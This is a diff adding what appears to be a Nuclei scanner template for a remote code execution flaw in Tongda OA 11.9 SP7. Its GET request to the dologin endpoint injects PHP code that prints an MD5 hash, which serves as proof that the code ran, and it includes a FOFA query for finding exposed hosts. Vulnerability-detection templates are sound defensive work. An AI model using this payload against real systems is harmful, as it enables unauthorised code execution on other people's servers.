@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - condition: and
+          type: word
+          words:
+            - 202cb962ac59075b964b07152d234b70
+            - status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{RootURL}}/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),//'
+id: tongda-oa-dologin-rce
+info:
+    author: xy
+    description: 通达OA 11.9 SP7 dologin远程代码执行漏洞
+    metadata:
+        fofa-query: app="TDXK-通达OA"
+        veified: true
+    name: tongda-oa-dologin-rce
+    reference:
+        - null
+    severity: high
+    tags:
+        - tongda
+        - 通达oa
+        - TDXK-通达OA
